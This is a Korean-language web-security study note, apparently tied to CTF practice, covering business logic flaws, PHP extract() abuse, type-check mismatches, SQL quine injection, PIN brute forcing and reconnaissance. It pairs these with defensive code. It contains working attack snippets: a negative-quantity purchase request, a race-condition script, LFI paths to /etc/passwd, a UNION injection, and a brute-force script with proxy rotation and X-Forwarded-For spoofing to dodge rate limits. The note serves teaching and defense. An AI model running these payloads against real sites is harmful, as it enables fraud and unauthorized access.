보안은 단순히 "검증을 한다"는 것만으로는 부족하다. **어떤 도구를 사용하느냐**, **검증의 순서와 로직이 일관되는가**가 훨씬 더 중요하다. 이 문제는 그 교훈을 완벽하게 보여준 100점짜리 보석 같은 문제였다.

---

## 핵심 개념 정리

### 1. 비즈니스 로직 취약점 (Business Logic Flaws)

애플리케이션의 업무 흐름이나 규칙을 우회하여 의도하지 않은 동작을 수행하는 취약점.

#### 주요 패턴:

```
1. 가격 조작 (Price Manipulation)
   - 클라이언트에서 전송되는 가격 정보 변조
   - 음수 수량으로 잔액 증가
   - 쿠폰/할인 중복 적용

2. 권한 우회 (Authorization Bypass)
   - 단계 건너뛰기 (Step Skipping)
   - 프로세스 순서 조작
   - 완료 상태 강제 변경

3. 수량/상태 조작 (Quantity/State Manipulation)
   - 재고 초과 구매
   - 동시성 문제 악용 (Race Condition)
   - 타임스탬프 조작
```

#### 실제 공격 예시:

```http
POST /purchase HTTP/1.1
Content-Type: application/x-www-form-urlencoded

item_id=1&price=100&quantity=-1
```

```python
# Race Condition 악용
import threading
import requests

def purchase():
    requests.post("https://example.com/purchase",
                 data={"item_id": 1, "quantity": 1})

threads = []
for i in range(10):  # 동시에 10개 구매 시도
    t = threading.Thread(target=purchase)
    threads.append(t)
    t.start()
```

### 2. PHP extract() 취약점

배열의 키-값 쌍을 변수로 변환하는 함수의 위험성.

#### 취약한 코드:

```php
<?php
extract($_GET);  // 매우 위험!

if($admin) {  // ?admin=1 로 우회 가능
    echo "Admin panel";
}

include($file);  // ?file=../../etc/passwd
?>
```

#### 공격 시나리오:

```php
// 1. 변수 생성
?debug=1
→ $debug = "1" 생성

// 2. 변수 덮어쓰기
?config_file=/etc/passwd
→ 기존 $config_file 값 변경

// 3. 조건 우회
?is_admin=true
→ 관리자 체크 우회

// 4. 파일 포함
?template=../../../flag.php
→ LFI 공격
```

#### 안전한 대안:

```php
// extract() 절대 사용 금지
$allowed = ['page', 'id', 'action'];

foreach($allowed as $key) {
    $$key = $_GET[$key] ?? null;
}

// 또는 직접 할당
$page = $_GET['page'] ?? 'home';
$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
```

### 3. is_numeric() vs Switch 불일치

PHP 타입 비교의 미묘한 차이점.

```php
// is_numeric() - 매우 관대함
is_numeric("123")     // true
is_numeric("123.45")  // true
is_numeric("1e10")    // true (과학적 표기법)
is_numeric("0x1A")    // true (16진수)
is_numeric(" 123 ")   // true (공백 허용)

// switch - 느슨한 비교지만 정확한 매칭
switch("1.5") {
    case 1:  // false
    case 2:  // false
    default: // true
}

// 안전한 검증
if(!in_array($type, ['1', '2', '3'], true)) {
    die("Invalid type");
}
```

### 4. SQL Quine (자기 복제 쿼리)

쿼리 결과가 쿼리 자체를 포함하는 특수한 SQL 구문.

#### 기본 Quine 예시:

```sql
-- 단순 Quine
SELECT REPLACE(REPLACE('SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$")',
               CHAR(34), CHAR(39)),
               CHAR(36),
               'SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$")');
```

#### 공격 활용:

```sql
-- 목표: $row['id'] == $_GET['id']를 만족
-- 입력값 자체가 쿼리 결과로 나와야 함

' UNION SELECT REPLACE(
    REPLACE('템플릿', CHAR(34), CHAR(39)),  -- " → '
    CHAR(36), '템플릿'                       -- $ → 템플릿
) AS id, 'password' AS pw #

-- 결과: 입력값과 쿼리 결과가 완벽히 일치
```

### 5. Brute Force와 Rate Limiting 우회

#### 기본 Brute Force:

```python
import requests
import time

session = requests.Session()
session.cookies.set('PHPSESSID', 'valid_session_id')

for pin in range(1000):
    formatted_pin = f"{pin:03d}"  # 000, 001, ..., 999

    response = session.get(
        f"https://target.com/login?pin={formatted_pin}"
    )

    if "FLAG" in response.text:
        print(f"[+] Found: {formatted_pin}")
        break

    time.sleep(0.1)  # Rate limiting 회피
```

#### 고급 우회 기법:

```python
# 1. IP 로테이션
proxies = ['proxy1:8080', 'proxy2:8080', ...]
for i, pin in enumerate(range(1000)):
    proxy = {'http': f'http://{proxies[i % len(proxies)]}'}
    requests.get(url, proxies=proxy)

# 2. 헤더 변조
headers = {
    'X-Forwarded-For': f'192.168.1.{i % 255}',
    'X-Real-IP': f'10.0.0.{i % 255}'
}

# 3. 세션 재생성
for pin in range(1000):
    if i % 100 == 0:
        session = requests.Session()  # 새 세션 시작
```

### 6. 정보 수집 (Information Gathering)

#### robots.txt 분석:

```
User-agent: *
Disallow: /admin/
Disallow: /backup/
Disallow: /api/internal/
Disallow: /.git/

# 공격자에게 유용한 정보:
# - 관리자 패널 위치
# - 백업 파일 위치
# - 내부 API 경로
# - Git 저장소 노출
```

#### 임시/백업 파일 탐색:

```bash
# Vim 스왑 파일
.index.php.swp
.config.php.swp

# 백업 파일
index.php.bak
index.php.old
index.php~
index.php.save

# 에디터 임시 파일
.index.php.swn
.index.php.swo
#index.php#

# 압축 백업
backup.tar.gz
backup.zip
site_backup_2024.sql

# 테스트 파일
test.php
phpinfo.php
info.php
```

---

## 방어 기법

### 1. 비즈니스 로직 보안

```php
// ✅ 서버 사이드 가격 검증
class PurchaseService {
    public function purchase($user_id, $item_id, $quantity) {
        // 1. DB에서 실제 가격 조회
        $item = $this->db->getItem($item_id);
        $real_price = $item['price'];

        // 2. 재고 확인
        if($item['stock'] < $quantity) {
            throw new Exception("Insufficient stock");
        }

        // 3. 음수 수량 방지
        if($quantity < 1) {
            throw new Exception("Invalid quantity");
        }

        // 4. 최종 금액 계산 (서버에서만)
        $total = $real_price * $quantity;

        // 5. 트랜잭션 사용 (Race Condition 방지)
        $this->db->beginTransaction();
        try {
            $this->db->deductBalance($user_id, $total);
            $this->db->deductStock($item_id, $quantity);
            $this->db->createOrder($user_id, $item_id, $quantity, $total);
            $this->db->commit();
        } catch(Exception $e) {
            $this->db->rollback();
            throw $e;
        }
    }
}
```

### 2. extract() 사용 금지

```php
// ❌ 절대 하지 말 것
extract($_GET);
extract($_POST);
extract($_REQUEST);

// ✅ 명시적 변수 할당
$page = $_GET['page'] ?? 'home';
$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);

// ✅ 화이트리스트 방식
$allowed_params = ['page', 'id', 'action'];
$params = [];
foreach($allowed_params as $param) {
    if(isset($_GET[$param])) {
        $params[$param] = $_GET[$param];
    }
}

// ✅ 타입 검증 강화
function getIntParam($name, $default = 0) {
    $value = $_GET[$name] ?? $default;
    if(!is_numeric($value) || strpos($value, '.') !== false) {
        return $default;
    }
    return (int)$value;
}
```

### 3. Rate Limiting 구현

```php
// Redis 기반 Rate Limiting
class RateLimiter {
    private $redis;

    public function checkLimit($ip, $max_attempts, $window_seconds) {
        $key = "rate_limit:$ip";
        $current = $this->redis->get($key) ?: 0;

        if($current >= $max_attempts) {
            http_response_code(429);
            die("Too many requests");
        }

        $this->redis->incr($key);
        $this->redis->expire($key, $window_seconds);
    }
}

// 사용
$limiter = new RateLimiter($redis);
$limiter->checkLimit($_SERVER['REMOTE_ADDR'], 100, 60);  // 분당 100회
```

```nginx
# Nginx Rate Limiting
limit_req_zone $binary_remote_addr zone=login:10m rate=5r/s;

location /login {
    limit_req zone=login burst=10 nodelay;
    ...
}
```

### 4. 임시 파일 보호

```apache
# Apache .htaccess
<FilesMatch "\.(bak|swp|swo|swn|old|save|~|tmp|temp|log|sql|gz|zip|tar)$">
    Require all denied
</FilesMatch>

# 숨김 파일 차단
<FilesMatch "^\.">
    Require all denied
</FilesMatch>
```

```nginx
# Nginx
location ~ \.(bak|swp|old|save|~|tmp)$ {
    deny all;
}

location ~ /\. {
    deny all;
}
```

```.gitignore
# Git에서 제외
*.swp
*.swo
*.bak
*.old
*.save
*~
.DS_Store
Thumbs.db
```

### 5. robots.txt 대안

```php
// ❌ robots.txt에 민감한 경로 명시하지 말것
// robots.txt:
// Disallow: /admin/
// Disallow: /secret/

// ✅ 서버 사이드 접근 제어
if(!$_SESSION['is_admin']) {
    http_response_code(404);  // 존재하지 않는 것처럼
    die();
}

// ✅ IP 화이트리스트
$allowed_ips = ['10.0.0.1', '192.168.1.100'];
if(!in_array($_SERVER['REMOTE_ADDR'], $allowed_ips)) {
    http_response_code(403);
    die("Access denied");
}
```

### 6. HTTP 헤더 보안

```php
// 민감한 헤더 제거
header_remove('X-Powered-By');
header_remove('Server');

// 보안 헤더 추가
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('X-XSS-Protection: 1; mode=block');
header('Referrer-Policy: no-referrer');

// 커스텀 디버그 헤더 절대 사용 금지
// header('X-Debug: true');  ❌
// header('FLAG: ...');      ❌
```

```apache
# Apache
ServerTokens Prod
ServerSignature Off
Header always set X-Content-Type-Options "nosniff"
Header always set X-Frame-Options "DENY"
```

---

## 참고 자료

### OWASP 가이드

- **OWASP Top 10 2021**: [A04:2021 – Insecure Design](https://owasp.org/Top10/A04_2021-Insecure_Design/)
- **Business Logic Vulnerabilities**: [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/)
- **Brute Force Attack**: [OWASP](https://owasp.org/www-community/attacks/Brute_force_attack)

### PortSwigger Academy

- **Business logic vulnerabilities**: [Web Security Academy](https://portswigger.net/web-security/logic-flaws)
- **Rate limiting**: [Best Practices](https://portswigger.net/web-security/race-conditions)

### PHP 보안

- **PHP extract() dangers**: [PHP Manual](https://www.php.net/manual/en/function.extract.php)
- **Type Juggling**: [PHP Type Comparison](https://www.php.net/manual/en/types.comparisons.php)

### 도구

- **Burp Suite**: HTTP 프록시 및 스캐너
- **OWASP ZAP**: 자동화 보안 스캐너
- **DirBuster**: 디렉토리/파일 브루트포스
- **GoBuster**: 고속 디렉토리 스캐너

### 추가 학습

- **SQL Quine**: [Wikipedia](https://en.wikipedia.org/wiki/Quine_(computing))
- **Race Conditions**: [OWASP Testing Guide](https://owasp.org/www-community/vulnerabilities/Race_Conditions)
- **robots.txt**: [Google Search Central](https://developers.google.com/search/docs/advanced/robots/intro)

---

**문제 수**: 9개
**난이도 분포**: 🟢 Beginner 4개 | 🟡 Intermediate 3개 | 🔴 Advanced 2개
**총 학습 시간**: 약 5시간 55분

**마지막 업데이트**: 2026-01-14
**버전**: 1.0
